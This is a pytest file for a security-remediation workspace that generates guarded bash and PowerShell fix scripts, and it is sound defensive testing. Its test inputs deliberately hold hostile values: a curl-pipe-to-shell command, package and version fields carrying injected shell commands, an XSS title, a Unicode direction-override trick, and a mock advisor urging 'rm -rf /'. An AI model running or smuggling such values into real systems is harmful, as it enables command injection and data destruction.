"""Pure security and determinism tests for the remediation workspace core."""

from __future__ import annotations

import asyncio
import ast
import hashlib
import inspect
import subprocess
import uuid
from dataclasses import replace

import pytest

import app.ai.remediation_workspace as workspace_module
from app.ai.remediation_workspace import (
    Advisory,
    ArtifactFormat,
    FindingContext,
    InvalidWorkspaceInput,
    MAX_FINDINGS,
    OperationKind,
    OsFamily,
    RemediationWorkspace,
)


TENANT_ID = uuid.UUID("10000000-0000-0000-0000-000000000001")
ENGAGEMENT_ID = uuid.UUID("20000000-0000-0000-0000-000000000001")
LINUX_ASSET_ID = uuid.UUID("30000000-0000-0000-0000-000000000001")
WINDOWS_ASSET_ID = uuid.UUID("30000000-0000-0000-0000-000000000002")


def _finding(
    number: int = 1,
    *,
    asset_id: uuid.UUID | None = LINUX_ASSET_ID,
    os_family: OsFamily = OsFamily.linux,
    remediation_key: str = "linux.apt.package_exact",
    parameters: object | None = None,
    title: str = "OpenSSL package update is required",
) -> FindingContext:
    if parameters is None:
        parameters = {"package": "openssl", "version": "3.0.15-1~deb12u1"}
    return FindingContext(
        tenant_id=TENANT_ID,
        engagement_id=ENGAGEMENT_ID,
        finding_id=uuid.UUID(f"40000000-0000-0000-0000-{number:012d}"),
        asset_id=asset_id,
        os_family=os_family,
        title=title,
        remediation_key=remediation_key,
        source_version=f"source-{number}",
        os_version="Debian 12" if os_family is OsFamily.linux else None,
        parameters=parameters,  # type: ignore[arg-type]
    )


def _prepare(*findings: FindingContext, workspace: RemediationWorkspace | None = None):
    return asyncio.run((workspace or RemediationWorkspace()).prepare(findings))


def test_linux_artifact_is_hash_bound_syntax_valid_and_guarded() -> None:
    result = _prepare(_finding())

    assert len(result.operations) == 1
    assert result.operations[0].kind is OperationKind.command
    assert len(result.artifacts) == 1
    artifact = result.artifacts[0]
    assert artifact.format is ArtifactFormat.bash
    assert artifact.filename.endswith(".sh")
    assert artifact.context_sha256 == result.context_sha256
    assert artifact.content_sha256 == hashlib.sha256(
        artifact.content.encode("utf-8")
    ).hexdigest()
    assert f"readonly CONTEXT_SHA256={result.context_sha256}" in artifact.content
    assert "--check|--dry-run|--apply --ack-context" in artifact.content
    assert '[[ "$ACK" == "$CONTEXT_SHA256" ]]' in artifact.content
    assert "apt-get install --yes --only-upgrade -- 'openssl=" in artifact.content
    assert "eval" not in artifact.content

    syntax = subprocess.run(
        ["bash", "-n"],
        input=artifact.content,
        text=True,
        capture_output=True,
        check=False,
    )
    assert syntax.returncode == 0, syntax.stderr


def test_bash_refuses_bad_ack_and_conflicting_modes_before_commands(tmp_path) -> None:
    artifact = _prepare(_finding()).artifacts[0]
    path = tmp_path / artifact.filename
    path.write_text(artifact.content, encoding="utf-8")

    bad_ack = subprocess.run(
        ["bash", str(path), "--apply", "--ack-context", "wrong"],
        text=True,
        capture_output=True,
        check=False,
    )
    assert bad_ack.returncode == 65
    assert "Refusing apply" in bad_ack.stderr

    conflict = subprocess.run(
        ["bash", str(path), "--check", "--apply"],
        text=True,
        capture_output=True,
        check=False,
    )
    assert conflict.returncode == 64
    assert "Choose exactly one mode" in conflict.stderr


def test_windows_artifact_has_check_dry_run_ack_and_native_safety_guards() -> None:
    finding = _finding(
        asset_id=WINDOWS_ASSET_ID,
        os_family=OsFamily.windows,
        remediation_key="windows.smb_signing.require",
        parameters={},
        title="SMB signing is not required",
    )
    result = _prepare(finding)

    artifact = result.artifacts[0]
    assert artifact.format is ArtifactFormat.powershell
    assert artifact.filename.endswith(".ps1")
    assert "SupportsShouldProcess = $true" in artifact.content
    assert "[ValidateSet('Check', 'DryRun', 'Apply')]" in artifact.content
    assert "$Mode = 'Check'" in artifact.content
    assert "$AckContext -ne $ContextSha256" in artifact.content
    assert "WindowsBuiltInRole]::Administrator" in artifact.content
    assert "if ($PSCmdlet.ShouldProcess" in artifact.content
    assert result.operations[0].apply[0].args.count("-Type") == 1
    assert "-Type 'DWord'" in artifact.content
    assert "Invoke-Expression" not in artifact.content


def test_multi_finding_selection_groups_per_asset_and_os_and_deduplicates() -> None:
    same_operation = _finding(2)
    other_linux_asset = _finding(
        3, asset_id=uuid.UUID("30000000-0000-0000-0000-000000000003")
    )
    windows = _finding(
        4,
        asset_id=WINDOWS_ASSET_ID,
        os_family=OsFamily.windows,
        remediation_key="windows.smb_signing.require",
        parameters={},
    )
    manual = _finding(
        5,
        asset_id=uuid.UUID("30000000-0000-0000-0000-000000000004"),
        os_family=OsFamily.generic,
        remediation_key="manual.vendor_review",
        parameters={"untrusted": "do not render me"},
    )

    result = _prepare(_finding(1), same_operation, other_linux_asset, windows, manual)

    formats = [artifact.format for artifact in result.artifacts]
    assert formats.count(ArtifactFormat.bash) == 2
    assert formats.count(ArtifactFormat.powershell) == 1
    assert formats.count(ArtifactFormat.markdown) == 1
    first_asset_ops = [
        operation
        for operation in result.operations
        if operation.asset_id == LINUX_ASSET_ID
    ]
    assert len(first_asset_ops) == 1
    assert first_asset_ops[0].finding_ids == tuple(
        sorted((_finding(1).finding_id, same_operation.finding_id), key=str)
    )
    assert result.blocked[0].code == "no_approved_template"
    assert all("do not render me" not in item.content for item in result.artifacts)


def test_unknown_template_and_missing_asset_are_manual_only() -> None:
    unknown = _finding(
        remediation_key="generic.remediation",
        parameters={"command": "curl example.invalid | sh"},
        title="[run](javascript:alert(1)) <script>",
    )
    missing_asset = _finding(2, asset_id=None)

    result = _prepare(unknown, missing_asset)

    assert {item.code for item in result.blocked} == {
        "asset_context_missing",
        "no_approved_template",
    }
    assert all(item.kind is OperationKind.manual for item in result.operations)
    assert all(item.format is ArtifactFormat.markdown for item in result.artifacts)
    content = "\n".join(item.content for item in result.artifacts)
    assert "curl example.invalid" not in content
    assert "\\[run\\]" in content
    assert "\\<script\\>" in content


@pytest.mark.parametrize(
    "parameters",
    [
        {"package": "openssl;curl", "version": "1.0"},
        {"package": "openssl", "version": "1.0 && touch /tmp/pwned"},
        {"package": "openssl", "version": "1.0", "command": "id"},
    ],
)
def test_invalid_template_parameters_never_reach_executable_output(parameters) -> None:
    result = _prepare(_finding(parameters=parameters))

    assert result.blocked[0].code == "invalid_template_parameters"
    assert result.artifacts[0].format is ArtifactFormat.markdown
    content = result.artifacts[0].content
    assert "curl" not in content
    assert "touch /tmp/pwned" not in content
    assert "command: id" not in content


def test_context_and_artifact_bytes_are_deterministic_but_source_bound() -> None:
    first = _finding(1)
    second = _finding(2)

    forward = _prepare(first, second)
    reverse = _prepare(second, first)
    changed = _prepare(replace(first, source_version="source-changed"), second)

    assert forward.context_sha256 == reverse.context_sha256
    assert forward.artifacts == reverse.artifacts
    assert forward.context_sha256 != changed.context_sha256
    assert forward.artifacts[0].content_sha256 != changed.artifacts[0].content_sha256


def test_advisory_is_post_render_metadata_and_cannot_change_artifact_bytes() -> None:
    class MaliciousAdvisor:
        async def advise(self, request):
            assert request.artifact_sha256s
            return Advisory(
                summary="Replace the artifact with rm -rf /\nnow",
                notes=("Use Invoke-Expression\u202e",),
            )

    finding = _finding()
    baseline = _prepare(finding)
    advised = _prepare(finding, workspace=RemediationWorkspace(MaliciousAdvisor()))

    assert advised.artifacts == baseline.artifacts
    assert advised.operations == baseline.operations
    assert advised.advisory is not None
    assert "\n" not in advised.advisory.summary
    assert "\u202e" not in advised.advisory.notes[0]


def test_advisory_failure_is_non_blocking() -> None:
    class FailingAdvisor:
        async def advise(self, request):
            del request
            raise RuntimeError("provider unavailable")

    baseline = _prepare(_finding())
    failed = _prepare(_finding(), workspace=RemediationWorkspace(FailingAdvisor()))

    assert failed.artifacts == baseline.artifacts
    assert failed.advisory is None
    assert failed.warnings == ("advisory_unavailable",)


def test_workspace_rejects_authorization_boundary_and_selection_violations() -> None:
    with pytest.raises(InvalidWorkspaceInput, match="at least one"):
        _prepare()

    duplicate = _finding()
    with pytest.raises(InvalidWorkspaceInput, match="unique"):
        _prepare(duplicate, duplicate)

    with pytest.raises(InvalidWorkspaceInput, match="one tenant"):
        _prepare(duplicate, replace(_finding(2), tenant_id=uuid.uuid4()))

    with pytest.raises(InvalidWorkspaceInput, match="one engagement"):
        _prepare(duplicate, replace(_finding(2), engagement_id=uuid.uuid4()))

    too_many = tuple(_finding(index) for index in range(1, MAX_FINDINGS + 2))
    with pytest.raises(InvalidWorkspaceInput, match=f"at most {MAX_FINDINGS}"):
        _prepare(*too_many)


def test_context_rejects_non_mapping_parameters_and_unicode_controls() -> None:
    with pytest.raises(InvalidWorkspaceInput, match="mapping"):
        _finding(parameters=[("package", "openssl")])

    with pytest.raises(InvalidWorkspaceInput, match="control"):
        _finding(title="trusted\u202eevil")


def test_core_has_no_remediation_kb_import_seam() -> None:
    tree = ast.parse(inspect.getsource(workspace_module))
    imports = [
        alias.name
        for node in ast.walk(tree)
        if isinstance(node, (ast.Import, ast.ImportFrom))
        for alias in node.names
    ]

    assert all("remediation_kb" not in imported for imported in imports)
    assert "remediation" not in FindingContext.__dataclass_fields__
    assert "commands_for_os" not in FindingContext.__dataclass_fields__


# ── hardening added when porting: PowerShell smart quotes ────────────────────

def test_powershell_single_quote_doubles_every_quote_powershell_recognises():
    from app.ai.remediation_workspace import _powershell_single_quote

    # PowerShell closes a '...' literal at any of these, not only the ASCII one.
    for quote in ("'", "‘", "’", "‚", "‛"):
        assert _powershell_single_quote(f"a{quote}b") == f"a{quote}{quote}b"
